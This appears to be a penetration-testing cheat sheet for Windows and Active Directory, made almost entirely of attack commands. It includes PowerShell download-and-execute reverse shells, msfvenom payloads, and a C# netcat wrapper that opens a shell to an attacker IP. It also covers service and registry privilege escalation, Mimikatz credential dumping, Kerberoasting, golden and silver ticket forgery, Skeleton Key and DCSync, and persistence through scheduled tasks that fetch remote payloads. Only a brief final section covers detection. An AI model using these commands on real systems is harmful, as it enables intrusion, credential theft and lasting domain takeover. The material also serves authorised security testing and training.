powershell.exe iex (iwr http://<file_server_IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port 443
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<file_server_IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port 443
```
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1  
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

* Bypass  
"Villain is a Windows & Linux backdoor generator and multi-session handler that allows users to connect with sibling servers (other machines running Villain) and share their backdoor sessions, handy for working as a team."  
https://github.com/t3l3machus/Villain
Hoaxshell  
"hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell."  
https://github.com/t3l3machus/hoaxshell

## Port Forwarding and Proxying
### Port Forwarding
#### SSH Tunneling/Local Port Forwarding  
```
ssh user@<ip> -p port -L 8001:127.0.0.1:8080 -fN
```

#### SSH Remote Port Forwarding
```
ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
```

#### Socat - Port Forward
```
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

#### chisel  - Remote Port Forward 
* Your machine  
```
./chisel server -p <LISTEN_PORT> --reverse &
```

* Compromised Host
```
./chisel client <ATTACKING_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
```

#### Chisel - Local Port Forward
* Compromised Host  
```
./chisel server -p <LISTEN_PORT>
```

* Your Machine  
```
./chisel client <LISTEN_IP>:<LISTEN_PORT> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

#### pklink - Remote Port Forward
```
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

### Proxying - Network Pivoting
#### sshuttle (Unix) - proxying  
```
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

#### SSH + Proxychains
edit /etc/proxychains.conf with socks4 127.0.0.1 8080
```
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```
  
#### chisel  - Reverse Proxy
* Your Machine  
```
./chisel server -p LISTEN_PORT --reverse &
```

* Compromised Host  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> R:socks &
```

#### chisel - Forward Proxy  
* Compromised Host  
```
./chisel server -p <LISTEN_PORT> --socks5
```

* Your Machine  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
```

#### metasploit - proxying 
```
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```

## Local Privilege Escalation
### binPath - Services
* Detection
```
. .\PowerUp.ps1
Get-ModifiableService -Verbose
```
or
```
Get-ModifiableService -Verbose
wmic service get Name,State,PathName | findstr "Running" | findstr "Program"  
wmic service get Name,State,PathName | findstr "Program"  
icacls <pathname>  
//(F) and (i) (F)
accesschk.exe -wuvc <service_name>
//RW Everyone  
//  SERVICE_CHANGE_CONFIG
sc qc <service_name>
```

* Exploitation - windows
```
certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
sc stop <service_name>  
sc query <service_name>  
sc start <service_name>  
```

https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  

### Unquoted Service Path - Services
* Detection
```
wmic service get Name,State,PathName | findstr "Program"  
sc qc <service_name>  
\\ BINARY_PATH_NAME display Unquoted Service Paths, without ""
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
or  
```
. .\PowerUp.ps1
Get-ServiceUnquoted -Verbose (PowerUp) 
```

* Exploitation
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > name <name_inside_the_path>.exe  
move <name_inside_the_path>.exe <service_path>  
sc stop <service_name>
sc start <service_name>
```
or  
```
Invoke-ServiceAbuse -Name <service_name> -UserName $(whoami)
```

### Unquoted Service Path - Services (STEALTH) - Evasion AV
* Install
```
sudo apt install mono-devel
```
* Wrapper.cs  
```
using System;
using System.Diagnostics;

namespace Wrapper{
        class Program{
                        static void Main(){
                        Process proc = new Process();
                        ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "<ip> <port> -e cmd.exe");
                        procInfo.CreateNoWindow = true;
                        proc.StartInfo = procInfo;
                        proc.Start();
                }
        }
}
```
* Compile C# Code
```
mcs Wrapper.cs
```
Now move to the target, and place it in the correct directory with the correct name to exploit the service.  
```
sc stop <nameservice>
```
```
sc start <nameservice>
```

#### Modify configuration of services - Services
```
Get-ModifiableService -Verbose (PowerUp)
```

### SeBackup / SeRestore - Windows Privileges
* Detection
```
whoami /priv
\\SeBackupPrivilege  
\\SeRestorePrivilege  
```

* Exploitation  
```
reg save hklm\system C:\Users\user\system.hive  
reg save hklm\sam C:\Users\user\sam.hive
```

### SeTakeOwnership - Windows Privileges
* Detection  
```
whoami /priv  
//SeTakeOwnership
```

* Exploitation  
```
takeown /f C:\Windows\System32\Utilman.exe  
icacls C:\Windows\System32\Utilman.exe /grant <user>:F  
copy cmd.exe utilman.exe
```
### SeImpersonate / SeAssignPrimaryToken - Windows Privileges
* Detection
```
whoami /priv
// SeAssignPrimaryTokenPrivilege
// SeImpersonatePrivilege
```

* Exploitation
```
powershell.exe -c "wget http://ip/RogueWinRM.exe -O RogueWinRM.exe"  
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\nc64.exe" -a "-e cmd.exe <ip> <port>"
```
or  
```
PrintSpoofer64.exe -i -c cmd
```
https://github.com/itm4n/PrintSpoofer

### Other Docs
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants  
https://github.com/gtworek/Priv2Admin

### Tasks
* Detection
```
schtasks
schtasks /query /tn <task> /fo list /v
icacls <task_path> 
\\ BUILTIN\Users:(I)(F)
```

* Exploitation
```
echo "net localgroup administrators user /add" > <task_path>
schtasks /run /tn <task>
```

### Autorun
* Detection
```  
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
\\FILE_ALL_ACCESS
```

* Exploitation  
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
```
```
move program.exe "C:\Program Files\Autorun Program"
logoff
```
  
### AlwaysInstallElevated
* Detection  
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer 
\\ value is 1  
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
\\ value is 1 
```

* Exploitation  
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=ip lport=port -f msi -o ok.msi
msiexec /quiet /qn /i C:\Temp\ok.msi
```

### Registry
* Detection
```
powershell.exe -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"  
\\NT AUTHORITY\INTERACTIVE Allow FullControl  
net localgroup administrators
```

* Exploitation
```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c (edit)  
sudo apt install gcc-mingw-w64  
x86_64-w64-mingw32-gcc windows_service.c -o ok.exe  
```
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\ok.exe /f  
sc start regsvc  
net localgroup administrators
```

### Executable Files
* Detection
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
\\RW Everyone  
\\  FILE_ALL_ACCESS  
net localgroup administrators
```

* Exploitation
```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c (edit)
sudo apt install gcc-mingw-w64  
x86_64-w64-mingw32-gcc windows_service.c -o ok.exe
```
```
copy /yc:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

### Startup Applications
* Detection - Windows
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F)  
\\BUILTIN\Users:(F)
```

* msfvenom - Attacker VM
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
```

* Exploitation - Windows
```
iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile ok.exe)
move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
logoff
```
  
### Hot Potatle
* Exploitation
```
net localgroup administrators  
powershell.exe -nop -ep bypass  
powershell.exe -c "wget https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1 -O Tater.ps1"  
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1  
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"  
net localgroup administrators
```
  
### DLL Hijacking
* Exploitation
```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_dll.c (edit)  
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll  
move hijackme.dll <path>  
sc stop <service_name> & sc start <service_name>  
```

### Automated Enumeration - Local Privilege Escalation
* PowerUp  
```
. .\PowerUp.ps1
Invoke-AllChecks
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  

* BeRoot  
```
. .\beRoot.exe
```
https://github.com/AlessandroZ/BeRoot/releases 

* Privesc  
```
. .\privesc.ps1
Invoke-PrivEsc
```
https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1  

* Winpeas  
```
winpeas.exe > outputfile.txt
```  
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

* PrivescCheck  
```
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```
https://github.com/itm4n/PrivescCheck 

* Windows Exploit Suggester - Next Generation (WES-NG)  
```
systeminfo > systeminfo.txt
```
```
python wes.py systeminfo.txt
```
  
https://github.com/bitsadmin/wesng

* Kernel Exploits - meterpreter  
```
run post/multi/recon/local_exploit_suggester
```

* windows-privesc-check2.exe  
```
windows-privesc-check2.exe --dump -G
```
https://github.com/pentestmonkey/windows-privesc-check

## Domain Privilege Escalation
### Kerberos Delegation
Delegation in Kerberos is a setting that allows reuse of end user credentials to access resources hosted on a different server.  
e.g  
Users authenticate to a web server and the web server makes requests to a database server. The web server can request access to resources (specific resources(Constrained Delegation), all resources(Unconstrained Delegation)) on the database server as a user and not as a web server service account.  

#### Unconstrained Delegation
<a href="https://adsecurity.org/wp-content/uploads/2015/08/Visio-KerberosUnconstrainedDelegation-visio.png">
  <img height=350 src="https://adsecurity.org/wp-content/uploads/2015/08/Visio-KerberosUnconstrainedDelegation-visio.png" />
</a>

Allows the first hop server to request access to any service or computer in the domain.  
* Discover domain computers which have unconstrained delegation enabled
```
Get-NetComputer -Unconstrained (PowerView)
Get-ADComputer -Filter {TrustedForDelegation -eq $True} (AD Module)
Get-ADUser -Filter {TrustedForDelegation -eq $True} (AD Module)
```

* Verify Local Admin Access, therefore, you need to have a user that has local administrator access on the server.  
```
Find-LocalAdminAccess
```
```
$sess = New-PSSession -ComputerName <hostname>
Invoke-Command -FilePath C:\Tools\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
```

*  Run the following mimikatz command in the new PowerShell session running with the user to check if a domain admin ticket already exists, before Create a new directory to avoid overwriting tickets from other users.  
```
mkdir user1
cd user1 
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls | select name
```

* If you don't have a domain admin ticket and you have to wait or trick a DA to access a resource on the server, use this trick:
```
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

* export tickets  
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls | select name
```

* Reuse the ticket by injecting it into lsass to get DA privileges:  
```
Invoke-Mimikatz -Command '"kerberos::ptt [0;a925ff]-2-0-60a10000-Administrator@krbtgt-EXAMPLE.OKCORP.LOCAL.kirbi"'
```

### Constrained Delegation
<a href="https://en.hackndo.com/assets/uploads/2019/02/constrained_delegation_schema.png" >
<img height=500 src="https://en.hackndo.com/assets/uploads/2019/02/constrained_delegation_schema.png" />
</a>

Allows the first hop server to request access only to specified services on specified computers.  
* Enumerate users and computers with constrained delegation enabled
```
Get-DomainUser -TrustedToAuth (PowerView)
Get-DomainComputer -TrustedToAuth (PowerView)
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

* Exploitation
```
.\kekeo.exe
tgt::ask /user:ok$ /domain:example.okcorp.local /rc4:<hash>
tgs::s4u /tgt:<tgt_file> /user:Administrator@<domain> /service:CIFS/<hostname>.<domain>
Invoke-Mimikatz -Command '"kerberos::ptt <tgs_file>"'
klist
```
or
```
.\Rubeus.exe s4u /user:ok$ /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/<hostname>.<domain>" /ptt
```
or
```
.\kekeo.exe
tgt::ask /user:<machine$>  /domain:example.okcorp.local /rc4:<hash_machine_account>
tgs::s4u /tgt:<tgt_file> /user:Administrator@<domain> /service:<service_name>|LDAP/<hostname>
Invoke-Mimikatz -Command '"kerberos::ptt <tgs_file>
klist
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Kerberoast
It is an attack technique where an attacker/user requests a TGS from the KDC for services running on behalf of user accounts in AD, after capturing the TGS from memory, the hash of the offline service account is broken.  
* Discover services running with user accounts
```
Get-NetUser -SPN
```

* After finding a user with defined SPN, request a ticket for the service.
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<service>/<hostname><domain>"
klist
```

* Dumping tickets to disk:
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

* Offline crack service account password  
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\<tgs_file>
```

https://raw.githubusercontent.com/OWASP/passfault/master/wordlists/wordlists/10k-worst-passwords.txt  
https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py  

### AS-REP Roasting
AS-REP Roasting is a technique where the goal is to dump hashes of user accounts that have Kerberos preauthentication disabled (Do not require Kerberos preauthentication property).  
Unlike Kerberoasting, these users do not need to be service accounts.  

* Enumerate the users who have Kerberos Preauth disabled. (PowerView) 
```
Get-DomainUser -PreauthNotRequired -Verbose
```

* Request the crackable encrypted part of AS-REP that can be broken  
```
Get-ASREPHash -UserName VPNxuser-Verbose`
```

* Use john or hashcat to break hashes offline  
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
* Crack krbtgs (Kerberos)
```
hashcat -m 13100 ../hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
```
john --format=krb5tgs hash.txt wordlist/wordlist.txt 
```
### Loading arbitrary DLL
Members of the DNSAdmins group Loading arbitrary DLL with the privileges of dns.exe ( SYSTEM )  
In case the DC also serves as DNS this will give us the escalation for the DA.  

Need privileges to restart DNS service.
* Detection (enumerate the members of the DNSAdmins group
```
Get-NetGroupMember -GroupName "DNSAdmins"
Get-ADGroupMember -Identity DNSAdmins
```

* Configure DLL using dnscmd.exe (needs RSAT DNS):
```
dnscmd dcorp-dc /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
type c:\Windows\System32\kiwidns.log
```

### Trust Abuse - MSSQL Servers
* Discovery - SPN Scanning
```
Get-SQLInstanceDomain
```

* Check Accessibility
```
Get-SQLConnectionTestThreaded
```
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

* Gather Information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

* Searching Database Links
```
Get-SQLServerLink -Instance srv-mssql -Verbose
```
or in .exe  
```
select * from master..sysservers
```

* Enumerating DatabaseLinks via powerUPSQL
```
Get-SQLServerLinkCrawl -Instance srv-mssql -Verbose
```
or  
* Enumerating DatabaseLinks via Openquery with - Openquery queries can be chained to access links within links(nested links)
```
select * from openquery("srv-sql1",'select * from openquery("srv-mgmt","select * from master..sysservers")')
```

* Executing Commands  
On the target server, either xp_cmdshell should be already enabled or if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:  
```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;')AT "eu-sql"
```

```
Get-SQLServerLinkCrawl -Instance srv-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
```
or
```
select * from openquery("srv-sql1",'select * from openquery("srv-mgmt","select * from openquery("us-sql",""select @@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
```
or  
```
Invoke-SQLOSCmd -Verbose -Command "powershell iex(New-Object Net.WebClient).DownloadString(‘http://<file_server>/Invoke-PowerShellTcp.ps1') -Instance <hostname>.<domain>
```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1

### forcechangepassword
```
Set-ADAccountPassword -Identity <user> -NewPassword (ConvertTo-SecureString -AsPlainText "okay@12345" -Force)
```

## Escalating privileges across domains 
There is an implicit two-way trust of domains with other domains in the same forest  
There are two ways of escalating privileges between domains in the same forest:  
– Trust tickets  
– Krbtgthash  

### Mimikatz - Mix
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"'
```
### Mimikatz -  Get Clear-Text Passwords of scheduled tasks
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
```

### Using the domain trust key - Child to parent using Trust Tickets  
* get rc4 trust key  
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```
or  
```
Invoke-Mimikatz-Command'"lsadump::dcsync/user:dcorp\mcorp$"'
```
* get SID current domain  
```
Get-DomainSID (PowerView)
```

* get SID of the enterprise admins group of the parent domain  
```
Get-DomainGroup -Identity "Enterprise Admins" -Domain <parent_domain>
```

* Exploiting  
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_domain> /service:krbtgt /rc4:<rc4_trust_key> /sid:<sid_current_domain> /sids:<sid_enterprise_admins> /target:<parent_domain> /ticket:C:\Tools\kekeo_old\trust_tkt.kirbi"'
```

```
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/ok-dc.<parent_domain>
.\kirbikator.exe lsa .\CIFS.ok-dc.<parent_domain>.kirbi
```
or  
```
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/ok-dc.<parent_domain> /dc:ok-dc.<parent_domain> /ptt
```
```
klist
```

### Using hash krbtgt - Child to parent using krbtgt hash  
* get hash krbtgt  
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

* get SID current domain  
```
Get-DomainSID (PowerView)
```

* get SID of the enterprise admins group of the parent domain  
```
Get-DomainGroup -Identity "Enterprise Admins" -Domain <parent_domain>
```
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ok.example.local /krbtgt:<ktbtgt_hash> /sid:<domain_sid> /sids:<sid_enterprise_admin_of_the_parent_domain>-519 /ticket:C:\Tools\kekeo_old\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\Tools\krbtgt_tkt.kirbi"'
```

* Schedule a task and run it as SYSTEM  
```
schtasks /create /S dev.dc.example.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheckx" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://ip/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S dev-dc.example.local /TN "STCheckx"
```
```
powercat -l -v -p 443 -t 1000
```

## Across Forest using Trust Tickets
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```
or  
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
```

* get SID current domain  
```
Get-DomainSID (PowerView)
```
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<forest_domain_1> /service:krbtgt /rc4:28167df917b795605413be3e5aa59426 /sid:S-1-5-21-1874506631-3219952063-538504511 /target:<forest_domain_2> /ticket:C:\Tools\kekeo_old\d2_trust_tkt.kirbi"'
```
```
.\asktgs.exe C:\Tools\kekeo_old\d2_trust_tkt.kirbi CIFS/<dc_forest_2>
.\kirbikator.exe lsa.\CIFS/<dc_forest_2>
```
or  
```
.\Rubeus.exe asktgs /ticket:C:\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/<dc_forest_2> /dc:<dc_forest_2> /ptt
```

## Persistence
### Golden Ticket 
It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.  

* Get krbtgt NTHash  
* lsa  
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
or  
* DCSync Attack that allows an adversary to simulate the behavior of a domain controller (DC) and retrieve password data via domain replication.   
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt'"
```

* get SID
```
Get-Domainsid (PowerView)
```

* Exploitation  
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /doimain:<domain> /sid:<domain_sid> /krbtgt:<nthash> /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```  
or  
```
load kiwi
golden_ticket_create -k krbtgt_nthash -d <domain> -i <id> -s <domain_sid> -u Administrator -t /tmp/golden.tck
kerberos_ticket_use /tmp/gold.tck
kerberos_ticket_list 
wmic /node:dc computersystem get name,username,domain
```

```
wmic /node:dc process call create "powershell -nop -exec bypass iex(new-object net.webclient).downloadstring('http://<ip>/rev.ps1')"
```

### Silver Ticket 
It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.  
* Get Domain SID  
```
GetDomainsid (PowerView)
```

* Get Machine Account Hash - RID 1000  
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```

* Exploitation  - Creating a Silver Ticket that gives us access to the DC HOST service.
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
```

* Creating and executing task  
```
schtasks /create /S <dc>.<domain> /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://ip/Invoke-PowerShellTcp.ps1''')'"
```
```
schtasks /Run /S <dc>.<domain> /TN "UserX"
```
```
powercat -l -p 443 -v -t 1024
```

* Creating a Silver Ticket that gives us access to the DC HOST service.  
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domain_sid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
```

* Creating a Silver Ticket that gives us access to the DC RPCSS service.  
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain>/sid:<domain_sid> /target:<dc>.<domain> /service:RPCSS /rc4:<machine_account_hash> /user:Administrator /ptt"'
```

### Skeleton Key
This malware infiltrates the LSASS (Local Security Authority Subsystem Service) process and creates a master password that can be used to authenticate to any Active Directory account within the compromised domain. The dangerous aspect of this attack is that users' existing passwords continue to function normally, meaning that the authentication process is not interrupted. This makes Skeleton Key attacks difficult to detect unless you know exactly what to look for.
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
Enter-PSSession -ComputerName <hostname> -Credential <domain>\<user>
```

* When mimikatz is used to carry out this attack, the default master password defined is "mimikatz".

### DSRM Persistence - Change the account login behavior by modifying the registry on the DC
Each domain controller has a local administrator account for the DC called a Directory Services Restore Mode (DSRM) account.  
By default the DSRM administrator is not allowed to log on to the network DC. We will change the account login behavior by modifying the registry on the DC.  
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<admin_nthash> /run:powershell.exe"'
```

### Custom SSP - Persistence
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
Invoke-Mimikatz -Command '"misc::memssp"'
type C:\Windows\system32\kiwissp.log
```

### Persistence using ACLs - AdminSDHolder
* Add FullControl permissions for a user to the AdminSDHolderusing PowerViewas DA  
```
Import-Module Microsoft.ActiveDirectory.Management.dll
Import-Module ActiveDirectory.psd1
. .\SetADACL.ps1
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName <user> -Rights All -Verbose
Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System, DC=<domain_child>, DC=<domain_root>, DC=local' -Principal <user> - Verbose
```

* Invoke-SDPropagator  
```
$sess = New-PSSession -ComputerName <hostname_dc>.<domain>
Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

* Abusing FullControl using PowerView_dev  
```
Get-ADUser -Identity <user>
Add-ADGroupMember -Identity 'Domain Admins' -Members <user> -Verbose
Get-ADGroupMember -Identity 'Domain Admins'
```

* Others - WriteMembers Permission for a user to the AdminSDHolder  
```
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName <user> -Rights ResetPassword -Verbose
```

* Others - ResetPassword Permission and abusing for a user to the AdminSDHolder  
```
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName <user> -Rights WriteMembers -Verbose
Set-DomainUserPassword -Identity <user> -AccountPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
Set-ADAccountPassword-Identity <user> -NewPassword(ConvertTo-SecureString "Password@123" -AsPlainText-Force) -Verbose
```

* Security Descriptors
```
Set-RemotePSRemoting -UserName <user> -Verbose
Set-RemotePSRemoting -UserName <user> -ComputerName <hostname> -Verbose
Set-RemotePSRemoting -UserName <user> -ComputerName <hostname> -Verbose -Remove
```

### DCSync Attack
DCSync is an attack that consists of simulating the behavior of a domain controller, recovering password data through domain replication, being widely used to recover the KRBTGT hash and later escalating to a golden ticket attack.
* Check if user Replication (DCSync) rights
```
Get-ObjectAcl -DistinguishedName "dc=example, dc=ok,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "<user>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

* Adding Replication Rights (DCSync) to a User using ACLs (requires high privilege) (PowerView)  
```
Add-ObjectAcl -TargetDistinguishedName "dc=example, dc=ok, dc=local" -PrincipalSamAccountName <user> -Rights DCSync -Verbose
```
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```
or  
* Using ActiveDirectory Module and Set-ADACL  
```
Import-Module Microsoft.ActiveDirectory.Management.dll
Import-Module ActiveDirectory.psd1
. .\Set-ADACL.ps1
Set-ADACL -DistinguishedName 'DC=example, DC=ok.corp, DC=local'-Principal <user> -GUID RightDCSync -Verbose
```
```
Get-ObjectAcl -DistinguishedName "dc=example,dc=ok.corp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "studentx") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

## Attacks Detection via Events
### Golden Ticket - Detection
Event ID:  
- 4624: Account Logon  
- 4672: Admin Logon  
```
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```

### Silver Ticket - Detection
Event ID: 
- 4624: Account Logon  
- 4634: Account Logoff  
- 4672: Admin Logon  
```
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```

### Skeleton Key - Detection
Event ID:  
- System Event ID 7045: A new service was installed in the system. (Type Kernel Mode driver)  
"Audit Privilege Usage" must be enabled for the events below:  
- Security Event ID 4673 - A privileged service was called  
- Event ID 4611 - A trusted logon process has been registered with the Local Security Authority  

```
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}
```
```
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}
```  

### DSRM - Detection
- Event ID 4657 - Audit creation/change of  
HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior

### Malicious SSP - Detection
- Event ID 4657 - Audit creation/change of:  
HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages  

### Kerberoast - Detection
Event ID:  
- Security Event ID 4769: A kerberos ticket was requested   
* Search filter, removing the following items from the query:  
- krbtgt service;   
- Service name ending with $;  
- Account name as follows: machine@domain.   

fault code is '0x0'  
Ticket encryption type is 0x17  
```
